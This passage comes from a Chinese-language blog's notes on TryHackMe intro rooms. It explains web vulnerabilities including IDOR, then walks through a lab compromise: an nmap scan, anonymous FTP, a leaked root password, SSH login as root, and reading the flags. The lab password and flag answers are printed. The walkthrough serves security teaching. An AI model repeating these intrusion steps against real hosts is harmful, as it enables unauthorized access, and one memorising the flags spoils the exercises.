                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230319225857754.png"
                      alt="image-20230319225857754"
                ></p>
<p>针对 Web 应用程序的常见攻击有很多，下面简单介绍一些攻击方式：</p>
<ul>
<li><p>在登录网站时：攻击者可以通过进行多次登录尝试来枚举发现有效密码；攻击者能够使用密码字典和一些自动化工具来针对登录页面来进行多次测试。(暴力枚举)</p>
</li>
<li><p>在搜索产品时：攻击者可以通过在搜索字段中添加特定字符和代码来尝试破坏目标系统；攻击者的目的是让目标系统返回它不应该返回的数据或者执行它不应该执行的程序。(注入类攻击)</p>
</li>
<li><p>在提供付款细节时：攻击者会检查 和付款细节相关的数据 是以明文形式发送还是使用了弱加密；加密是指 让数据在不知道密钥或密码的情况下变得不可读。(明文、弱加密)</p>
</li>
</ul>
<p>tips：本小节只介绍一些针对Web应用程序的攻击方式 而并非全部。</p>
<h3 id="身份识别和验证错误"><a href="#身份识别和验证错误" class="headerlink" title="身份识别和验证错误"></a>身份识别和验证错误</h3><p>身份识别(Identification)是指 可以对用户身份进行唯一识别的能力，而身份验证(authentication)是指 可以证明用户实际身份和用户所声称的身份相符合的能力；当用户登录网上商店时，正常情况下：商店必须先识别用户的身份并进行身份验证，然后才能让用户使用该在线购物系统。</p>
<p>如果网站的身份识别和身份验证机制不佳，那么在网站登录界面就可能存在一些漏洞，关于此类漏洞的示例有：</p>
<ul>
<li><p>目标网站允许攻击者使用暴力枚举；攻击者能够尝试多次输入不同密码以进行登录操作——通常攻击者会使用自动化工具来暴力枚举，从而找到有效的登录凭据。</p>
</li>
<li><p>目标网站允许正常用户使用弱密码；弱密码通常很容易被攻击者猜到。</p>
</li>
<li><p>目标网站以明文形式存储用户密码；如果此时攻击者能够设法读取包含密码的文件，那么他们就能够获知存储的密码内容。</p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230319234328832.png"
                      alt="image-20230319234328832"
                ></p>
<h3 id="损坏的访问控制机制"><a href="#损坏的访问控制机制" class="headerlink" title="损坏的访问控制机制"></a>损坏的访问控制机制</h3><p>访问控制(Access control)机制 能够确保每个用户只能访问与其角色或工作相关的文件（文档、图像等）；例如，公司的网站管理员应该不希望市场部的某人能够直接访问（阅读）财务部的文档。</p>
<p>与访问控制相关的示例漏洞包括：</p>
<ul>
<li><p>网站管理员未能应用最小权限原则并为用户提供超出其需要的访问权限；例如，在线客户应该能够查看商品的价格，但他们不应该能够更改商品价格。</p>
</li>
<li><p>攻击者能够使用用户的唯一标识符查看或修改他人的帐户信息；例如，你应该不希望一个银行客户能够查看另一个客户的交易详情。</p>
</li>
<li><p>攻击者能够以未经身份验证的用户身份 浏览需要身份验证（登录）的页面；例如，我们不应该让任何人在登录之前就能查看到网络邮件内容。</p>
</li>
</ul>
<h3 id="注入攻击"><a href="#注入攻击" class="headerlink" title="注入攻击"></a>注入攻击</h3><p>注入攻击是指 对 Web 应用程序中的注入类漏洞进行利用，在注入类漏洞存在的情况下：攻击者可以插入恶意代码作为用户输入内容的一部分。</p>
<p>注入类漏洞存在的一个原因是 目标网站缺乏对“用户输入”的适当验证和清理。</p>
<h3 id="未成功加密"><a href="#未成功加密" class="headerlink" title="未成功加密"></a>未成功加密</h3><p>此类漏洞的存在是由于发生了与密码学相关的错误，密码学侧重于数据的加密和解密过程，加密是指 对明文内容使用加密算法计算以得到密文；对于没有密钥解密的人来说，经过加密产生的密文是无法读懂的，换句话说，加密能够确保没有人可以在不知道密钥的情况下直接读取数据，只有使用密钥进行解密 才能将密文转换回原始明文。</p>
<p>未成功加密(加密失败)的例子包括：</p>
<ul>
<li>目标网站以明文形式发送敏感数据，例如，网站使用 HTTP 协议而不是 HTTPS 协议； HTTP 是用于访问 Web 的协议，而 HTTPS 是 HTTP 的安全版本，攻击者可以阅读通过 HTTP 协议发送的所有内容，但不能阅读使用 HTTPS 协议发送的内容。</li>
<li>目标网站依赖弱密码算法进行加密（很容易被破解）；有一种古老的密码算法是将每个字母移位一个，例如，将“TRY HACK ME”变成“USZ IBDL NF”，如果使用这种加密算法就很容易被攻击者破解密文。</li>
<li>目标网站使用默认或弱密钥进行加密；破解使用 1234 作为密钥的加密并不困难，所以如果使用弱密钥加密就很容易被攻击者破解。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230421124046841.png"
                      alt="image-20230421124046841"
                ></p>
<p><strong>答题</strong></p>
<blockquote>
<p>Identification and Authentication Failure 身份识别和身份验证错误</p>
<p>Cryptographic Failures 未成功加密（加密失败）</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230319214337998.png"
                      alt="image-20230319214337998"
                ></p>
<h2 id="Web-应用程序安全实例"><a href="#Web-应用程序安全实例" class="headerlink" title="Web 应用程序安全实例"></a>Web 应用程序安全实例</h2><p>本小节将调查一个存在<u>不安全直接对象引用</u> (IDOR漏洞) 的易受攻击的示例网站。</p>
<p>IDOR漏洞属于损坏的访问控制机制的一种，所谓 损坏的访问控制机制 意味着攻击者可以访问不适合他们访问的信息 或者 执行不适合他们执行的操作。</p>
<p>Web 服务器能够接收用户提供的输入以检索对象（文件、数据、文档），这些被检索的对象可能是按顺序编号的；我们假设当前用户有权访问名为 IMG_1003.JPG 的照片，我们可能会猜测 Web服务器上还存在IMG_1002.JPG照片 和 IMG_1004.JPG照片；然而，即使我们已经知道了图像文件的名称，Web 应用程序也不应该向我们提供某些图像。一般来说，如果Web应用程序对“用户输入”的信任度过高，就可能会出现IDOR漏洞，换句话说，此时 Web 应用程序并没有严格验证用户是否有权访问所请求的对象。</p>
<p>即使知道了某个用户或某个产品相关的正确 URL 也不一定意味着当前用户应该能够访问这些 URL（所以这需要我们进行实际的访问验证）。假设我们已经知道某个产品页面的URL： <a class="link"   href="https://store.tryhackme.thm/products/product?id=52" >https://store.tryhackme.thm/products/product?id=52 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ；我们可以期望此 URL 会提供有关编号为 52 的产品详细信息；如果在数据库中，产品数据项是将按顺序分配编号的，那么攻击者就可以尝试使用其他数字 如 51 或 53来取代URL中的 52；一旦目标 Web 应用程序存在IDOR漏洞，那么攻击者就可能会访问到 其他已停用产品或未发布产品的相关页面。</p>
<p>让我们考虑一个更关键的例子(此例基于目标系统存在IDOR漏洞的前提条件下)，假设有一个URL <a class="link"   href="https://store.tryhackme.thm/customers/user?id=16" >https://store.tryhackme.thm/customers/user?id=16 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，这个URL将返回 id&#x3D;16 的用户相关页面；同样，我们希望用户所对应的 ID 号是连续的，那么攻击者就可以尝试在URL中使用其他ID号 并可能成功访问到其他用户帐户所相关的页面（进而能够查看到其他用户的敏感信息）。</p>
<p>IDOR漏洞也适用于访问一些按顺序命名并存储的文件；例如，攻击者在URL中看到007.txt，那么可以尝试使用其他文件名称，如001.txt、006.txt等。(此例基于目标系统存在IDOR漏洞的前提条件下)</p>
<p><strong>答题</strong></p>
<p><em>在本文相关的Tryhackme实验房间页面 部署虚拟实验环境，并完成本小节对应的实例。</em></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230319215632445.png"
                      alt="image-20230319215632445" style="zoom: 67%;" 
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230319220131634.png"
                      alt="image-20230319220131634" style="zoom:67%;" 
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230319220240818.png"
                      alt="image-20230319220240818" style="zoom:67%;" 
                >

<blockquote>
<p>最后得到的flag内容为：THM{IDOR_EXPLORED} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230319215450568.png"
                      alt="image-20230319215450568"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Network Security(网络安全介绍)-学习</title>
    <url>/2024/01/16/THM-Network%20Security(%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BB%8B%E7%BB%8D)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/intronetworksecurity" >https://tryhackme.com/room/intronetworksecurity <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：简单介绍网络安全概念，了解基本的网络攻击步骤，并尝试完成一个侵入目标服务器的实例。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>计算机网络是一组相互连接的计算机和设备，而网络安全则侧重于保护这些设备以及连接它们的链路的安全。（更准确地说，网络安全包括了保护计算机网络及其数据的机密性、完整性和可用性的一切安全设备、安全技术和过程）</p>
<p>网络安全由不同的硬件和软件解决方案组成，以实现既定的安全目标。网络安全的硬件解决方案是指 你在网络中设置的用于保护网络安全的设备，这些设备是硬件，所以你可以在现实中接触到它们。硬件设备可能类似于下图：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230322195255546.png"
                      alt="image-20230322195255546"
                ></p>
<p>网络安全硬件设备的示例包括：</p>
<ul>
<li>防火墙设备：防火墙将根据一组预定义的规则来允许和阻止连接，它将限制什么可以进入网络 和 什么可以离开网络。</li>
<li>入侵检测系统 (IDS) 设备：IDS 会检测系统入侵、网络入侵以及入侵企图，它会尝试检测攻击者侵入你的网络的企图。</li>
<li>入侵防御系统 (IPS) 设备：IPS 可阻止检测到的入侵行为和入侵企图，它旨在防止攻击者闯入你的网络。</li>
<li>虚拟专用网络 (VPN) 集线器设备：VPN 可确保网络流量无法被第三方读取或更改，它保护发送的数据的机密性（secrecy）和完整性。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230322200053263.png"
                      alt="image-20230322200053263"
                ></p>
<p>另一方面，网络安全也有软件解决方案，常见的例子有：</p>
<ul>
<li>防病毒软件：你可以在计算机或者智能手机上安装防病毒软件以检测恶意文件并阻止它们的执行。</li>
<li>主机防火墙：与防火墙设备（硬件设备）不同，主机防火墙是作为操作系统的一部分而被提供的程序，或者是安装在操作系统上的程序。例如，MS Windows 操作系统中就包含了 Windows Defender 防火墙程序，Apple macOS 中也包含了应用防火墙(application firewal)，以上两者都是主机防火墙。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230322200919536.png"
                      alt="image-20230322200919536"
                ></p>
<p>根据 IBM Security 发布的<a class="link"   href="https://newsroom.ibm.com/2021-07-28-IBM-Report-Cost-of-a-Data-Breach-Hits-Record-High-During-Pandemic" >《2021 年数据泄露成本报告》 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，2021 年数据泄露平均每起事件给公司造成 424 万美元的损失，而 2020 年为 386 万美元，平均成本因行业和国家&#x2F;地区而异。 例如，医疗行业数据泄露的平均总成本为 923 万美元，而教育行业则为 379 万美元。</p>
<h3 id="答题"><a href="#答题" class="headerlink" title="答题"></a><strong>答题</strong></h3><blockquote>
<p>Windows Defender 防火墙是什么类型的防火墙：Host Firewall</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230320215249669.png"
                      alt="image-20230320215249669"
                ></p>
<h2 id="网络攻击步骤介绍"><a href="#网络攻击步骤介绍" class="headerlink" title="网络攻击步骤介绍"></a>网络攻击步骤介绍</h2><p>每个“操作”的执行 都需要拥有某种形式的计划才能最终取得成功。假如你对野生动物摄影感兴趣，除非你完全不在乎结果，否则你不能只是拿起相机就直接前往丛林进行摄影，为了安全、成功地进行野生动物摄影之旅，你往往需要更多地去了解你想要用相机拍摄的动物(这包括动物的习性和你要避免的危险)；以上例子同样适用于针对目标网络进行攻击的网络安全行动。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230322201637351.png"
                      alt="image-20230322201637351"
                ></p>
<p>闯入目标网络通常包括多个步骤，根据<a class="link"   href="https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html" >洛克希德·马丁公司 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的说法，网络杀伤链有七个步骤：</p>
<ol>
<li>Recon(侦察)：Recon，是reconnaissance(侦察)的缩写，指的是攻击者将在此阶段 试图尽可能多地了解目标，主要包括——目标的服务器类型、操作系统、IP 地址、用户名和电子邮件地址等信息，获取到这些信息将有利于网络攻击成功。</li>
<li>Weaponization(武器化(：这一步是指准备一个带有恶意组件的文件，例如，相关恶意组件能够为攻击者提供远程访问。</li>
<li>Delivery(投递)：投递是指通过任何可行的方式将“武器化”的文件投递给目标，例如通过电子邮件或者U盘进行投递。</li>
<li>Exploitation(利用)：当用户打开（攻击者所投递的）恶意文件时，用户所使用的系统就会执行恶意组件。</li>
<li>Installation(安装)：经过上一步的恶意组件执行之后，目标系统就会被安装上恶意软件。</li>
<li>Command &amp; Control(命令与控制-C2)：恶意软件的成功安装会为攻击者提供对目标系统的命令和控制能力。</li>
<li>Actions on Objectives(针对目标的行动)：在获得对一个目标系统的控制权后，攻击者就能够达到他们的行动目标，关于行动目标的示例：数据泄露（一旦成功窃取到了目标系统的数据，即代表攻击者达到行动目标）。</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230322204848872.png"
                      alt="image-20230322204848872" style="zoom:67%;" 
                >

<p>关于网络攻击步骤的另一个类比是：对目标房屋感兴趣的小偷。小偷在开始行动之前，往往会花一些时间了解目标房屋，谁住在那里，他们什么时候离开以及什么时候回家，小偷还会确定目标房屋是否有安装安全摄像头以及警报系统，一旦收集到足够的信息，小偷就会制定最佳的进入策略。关于物理盗窃的计划和执行在某种程度上也类似于旨在闯入网络并窃取数据的恶意攻击行为。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/a8e61f1f9a2ea3612d3bf84f9a11f41c.png"
                      alt="a8e61f1f9a2ea3612d3bf84f9a11f41c" 
                >

<h3 id="答题-1"><a href="#答题-1" class="headerlink" title="答题"></a><strong>答题</strong></h3><blockquote>
<p>攻击者在网络杀伤链的哪一步收集有关目标的信息：Recon (侦察)</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230320215635939.png"
                      alt="image-20230320215635939"
                ></p>
<h2 id="网络安全实例"><a href="#网络安全实例" class="headerlink" title="网络安全实例"></a>网络安全实例</h2><p>在本小节的实例中，我们将尝试侵入目标 Linux 系统。</p>
<p>我们攻击的第一步是侦察；我们可以使用不同的工具来加快我们的侦察活动，这些工具将收集与目标相关的各个方面的信息。</p>
<p>为了简单起见，我们将在此使用Nmap工具，Nmap是 Network Mapper 的缩写，它是一个网络扫描器，可以帮助我们发现正在运行的机器（存活主机）以及在这些机器上运行的任何对外界可见的程序（计算机服务）。我们可以通过在终端提示符下运行 <code>nmap MACHINE_IP</code>命令来扫描目标IP：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">tips：在实际执行命令时，我们直接用目标ip地址代替下面命令中的MACHINE_IP。</span></span><br><span class="line"><span class="meta prompt_">root@AttackBox# </span><span class="language-bash">nmap MACHINE_IP</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-06 17:38 EEST</span><br><span class="line">Nmap scan report for MACHINE_IP</span><br><span class="line">Host is up (0.00024s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.33 seconds</span><br></pre></td></tr></table></figure></div>

<p>我们发现了三个服务正在运行：</p>
<ol>
<li>FTP 服务器：FTP 代表文件传输协议，用于在机器之间传输文件。</li>
<li>SSH 服务器：SSH 代表 Secure Shell，用于安全远程登录，换句话说，它允许你在远程系统上安全地执行命令。</li>
<li>HTTP 服务器：HTTP 代表超文本传输协议，用于web服务，每当你在网站上浏览网页时，你都在使用 HTTP协议 或 HTTPS协议，HTTPS 是 HTTP 的安全（加密）版本。</li>
</ol>
<p>你还可以注意到 Nmap 会根据主机是否收到任何响应来报告主机是否已启动（存活），这有助于我们知道什么时候目标机器将显示没有端口打开或者显示没有端口可访问。</p>
<p>让我们尝试收集有关 FTP 服务器的更多信息：</p>
<ol>
<li>我们将在 AttackBox 的终端中输入 <code>ftp MACHINE_IP</code> 命令来连接到目标的 FTP 服务器。</li>
<li>接下来我们尝试使用login anonymous登录，看看这个FTP服务器是否支持匿名登录。</li>
<li>成功完成匿名登录之后，我们可以尝试使用命令 ls（list的缩写）来查看可用的文件，我们能得到文件名列表及文件的详细信息。</li>
<li>如果你对所发现的任何文件感到好奇，可以使用 <code>get filename</code> 命令来进行下载，比如我想知道 secret.txt 文件包含什么，所以使用 <code>get secret.txt</code> 命令来进行文件下载。</li>
<li>成功下载文件之后，键入 <code>exit</code> 或 <code>bye</code> 即可退出 FTP 客户端。</li>
</ol>
<p>与目标FTP服务器的交互过程将如下所示：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">root@AttackBox# </span><span class="language-bash">ftp MACHINE_IP</span></span><br><span class="line">Connected to MACHINE_IP (MACHINE_IP).</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (MACHINE_IP:root): anonymous</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line"><span class="meta prompt_">ftp&gt; </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">227 Entering Passive Mode (10,20,30,130,181,190).</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 ftp      ftp        425351 Apr 06 11:22 2680-0.txt</span><br><span class="line">-rw-r--r--    1 ftp      ftp           356 Apr 06 11:22 2680.epub</span><br><span class="line">-rw-r--r--    1 ftp      ftp        251857 Apr 06 11:22 55317-0.txt</span><br><span class="line">-rw-r--r--    1 ftp      ftp           358 Apr 06 11:22 55317.epub</span><br><span class="line">-rwxr-xr-x    1 ftp      ftp           214 Apr 06 11:22 backup.sh</span><br><span class="line">-rw-r--r--    1 ftp      ftp            23 Apr 06 11:22 secret.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta prompt_">ftp&gt; </span><span class="language-bash">get secret.txt</span> </span><br><span class="line">local: secret.txt remote: secret.txt</span><br><span class="line">227 Entering Passive Mode (10,20,30,130,159,46).</span><br><span class="line">150 Opening BINARY mode data connection for secret.txt (23 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">23 bytes received in 0.00107 secs (21.48 Kbytes/sec)</span><br><span class="line"><span class="meta prompt_">ftp&gt; </span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line">221 Goodbye.</span><br></pre></td></tr></table></figure></div>

<p>我们注意到上述FTP服务器中一共有六个文件：三个 txt 文件、两个 epub 文件和一个 sh 文件。txt和epub扩展名分别用于文本文件和电子书文件，而 sh 扩展名则表示该文件是一个 shell 脚本，shell 脚本通常会包含一组需要重复执行的命令。</p>
<p>在我们使用 FTP 命令 <code>get secret.txt</code>下载文件secret.txt 并使用<code>exit</code>退出 FTP 客户端之后，我们就会返回到攻击机的终端界面；此时我们可以在攻击机的终端界面中使用<code>cat secret.txt</code>命令来显示 secret.txt 文件的文本内容。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">root@AttackBox# </span><span class="language-bash"><span class="built_in">cat</span> secret.txt</span> </span><br><span class="line">password: [redacted]   #实际上这行会显示密码信息，此处的redacted表示隐藏（相当于马赛克）的意思</span><br></pre></td></tr></table></figure></div>

<p>我们得到了一个无意中复制到公共 FTP 服务器上的账户密码明文，让我们试试看它是否适用于 root 帐户（root账户在Linux系统上拥有完全的权限，可以读写任何文件，能够安装和删除任何程序）。在攻击机终端界面，我们可以输入 <code>ssh root@MACHINE_IP</code>来进行ssh登录，随后我们将被要求输入root账号的密码以进行身份验证，我们直接尝试输入我们在 FTP 服务器上发现的密码明文即可。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">root@AttackBox# </span><span class="language-bash">ssh root@MACHINE_IP</span></span><br><span class="line">root@MACHINE_IP&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Thu  7 Apr 08:16:42 UTC 2022</span><br><span class="line"></span><br><span class="line">  System load:  0.15              Processes:              225</span><br><span class="line">  Usage of /:   64.6% of 6.53GB   Users logged in:        0</span><br><span class="line">  Memory usage: 19%               IPv4 address for ens33: MACHINE_IP</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"> * Super-optimized for small spaces - read how we shrank the memory</span><br><span class="line">   footprint of MicroK8s to make it the smallest full K8s around.</span><br><span class="line"></span><br><span class="line">   https://ubuntu.com/blog/microk8s-memory-optimisation</span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Thu Apr  7 07:53:28 2022 from 10.10.10.1</span><br></pre></td></tr></table></figure></div>

<p>以 root 身份完成ssh登录后，我们就可以完全控制目标服务器了，为了查找目标文件 我们可以使用以下 Linux 命令：</p>
<ol>
<li>使用<code>pwd</code>命令，pwd是print working directory 的缩写，此命令可用来查看我们在系统中的当前位置。</li>
<li>使用<code>ls</code>命令来列出文件信息，查看文件列表中有无目标文件。</li>
<li>使用<code>cat flag.txt</code>命令来查看文件内容。</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">root@AttackBox# </span><span class="language-bash"><span class="built_in">pwd</span></span></span><br><span class="line">/root</span><br><span class="line"><span class="meta prompt_">root@AttackBox# </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">flag.txt  snap</span><br><span class="line"><span class="meta prompt_">root@AttackBox# </span><span class="language-bash"><span class="built_in">cat</span> flag.txt</span> </span><br><span class="line">[redacted]</span><br></pre></td></tr></table></figure></div>

<p>因为我们以 root 身份完成了登录，所以我们可以完全访问所有文件，包括其他用户的文件，我们可以执行以下 Linux 命令进行探索：</p>
<ol>
<li><p>使用<code>cd /home</code> 命令转到包含所有用户主目录的目录吗，cd 是 change directory（更改目录）的缩写。</p>
</li>
<li><p>我们在&#x2F;home目录中运行<code>ls</code>命令，查看系统的所有用户名称，因为我们拥有系统管理员（root）权限，所以我们可以直接检查其他用户的主文件夹下的内容。</p>
</li>
<li><p>使用<code>cd librarian</code>命令进入用户librarian的目录。</p>
</li>
<li><p>使用 <code>pwd</code> 命令以查看我们在系统中的当前位置（ &#x2F;home&#x2F;librarian）。</p>
</li>
<li><p>使用<code>ls</code>命令显示 librarian 目录下的文件信息，查看文件列表中有无目标文件。</p>
</li>
<li><p>我们可以使用<code>cat flag.txt</code>命令打印文本文件内容到终端界面。</p>
</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">root@AttackBox# </span><span class="language-bash"><span class="built_in">cd</span> /home</span></span><br><span class="line"><span class="meta prompt_">root@AttackBox# </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">ftpsecure  librarian  strategos</span><br><span class="line"><span class="meta prompt_">root@AttackBox# </span><span class="language-bash"><span class="built_in">cd</span> librarian/</span></span><br><span class="line"><span class="meta prompt_">root@AttackBox# </span><span class="language-bash"><span class="built_in">pwd</span></span></span><br><span class="line">/home/librarian</span><br><span class="line"><span class="meta prompt_">root@AttackBox# </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">flag.txt</span><br><span class="line"><span class="meta prompt_">root@AttackBox# </span><span class="language-bash"><span class="built_in">cat</span> flag.txt</span> </span><br><span class="line">[redacted]</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/a708c20aa1243c8e2be30bb9e74bd663.png"
                      alt="img"
                ></p>
<p>让我们总结一下我们在本小节中的工作，我们的目标是获取 IP 地址为MACHINE_IP的目标系统的root访问权限：</p>
<ol>
<li>我们使用 nmap 来了解目标机器正在运行的服务。</li>
<li>我们连接到目标机的 FTP 服务器以了解有关其配置的更多信息。</li>
<li>我们发现一个包含root密码的文件被错误地复制到了FTP服务器中的公共文件夹下。</li>
<li>我们使用找到的密码，以root用户身份来进行ssh登录。</li>
<li>最终，我们获得了所有用户文件的访问权限（因为此时的用户身份为root）。</li>
</ol>
<h3 id="答题-2"><a href="#答题-2" class="headerlink" title="答题"></a><strong>答题</strong></h3><p><em>在本文相关的Tryhackme实验房间页面 部署虚拟实验环境，并完成本小节对应的实例。</em></p>
<p><em><strong>问题</strong></em></p>
<ol>
<li>secret.txt文件内容中的密码是什么？</li>
<li>&#x2F;root目录中的flag.txt文件内容是什么？</li>
<li>&#x2F;home&#x2F;librarian目录中的flag.txt文件内容是什么？</li>
</ol>
<p><em><strong>操作</strong></em></p>
<p>使用nmap进行端口扫描：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -T4 10.10.98.42</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230322221312517.png"
                      alt="image-20230322221312517"
                ></p>
<blockquote>
<p>目标机器上存在FTP服务且允许进行匿名登录</p>
</blockquote>
<p>针对目标机的ftp服务进行匿名登录尝试：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ftp 10.10.98.42</span><br><span class="line">anonymous</span><br><span class="line">ls</span><br><span class="line">get secret.txt </span><br><span class="line">exit</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230322221546534.png"
                      alt="image-20230322221546534"
                ></p>
<p>下载完敏感文件后，在攻击机终端查看到该文件内容为root用户的密码明文，所以我们基于已知密码 直接尝试以root用户身份进行ssh登录：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cat secret.txt #password: ABC789xyz123</span><br><span class="line"></span><br><span class="line">ssh root@10.10.98.42</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230322221617429.png"
                      alt="image-20230322221617429"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230322221757084.png"
                      alt="image-20230322221757084"
                ></p>
<blockquote>
<p>secret.txt文件内容中的密码是：ABC789xyz123 。</p>
</blockquote>
<p>成功完成ssh登录成功后，我们获得了root权限，接下来我们将查找目标系统上的目标文本文件并查看相关的文本内容：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">cat flag.txt</span><br><span class="line"></span><br><span class="line">cd /home</span><br><span class="line">ls</span><br><span class="line">cd /home/librarian/</span><br><span class="line">ls</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230322222032954.png"
                      alt="image-20230322222032954"
                ></p>
<blockquote>
<p>&#x2F;root目录中的flag.txt文件内容是：THM{FTP_SERVER_OWNED} 。</p>
<p>&#x2F;home&#x2F;librarian目录中的flag.txt文件内容是：THM{LIBRARIAN_ACCOUNT_COMPROMISED} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230320215901969.png"
                      alt="image-20230320215901969"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Intro to Digital Forensics(数字取证介绍)-学习</title>
    <url>/2024/01/16/THM-Intro%20to%20Digital%20Forensics(%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81%E4%BB%8B%E7%BB%8D)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/introdigitalforensics" >https://tryhackme.com/room/introdigitalforensics <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：了解数字取证及其相关流程，并完成相关的简单实例。</p>
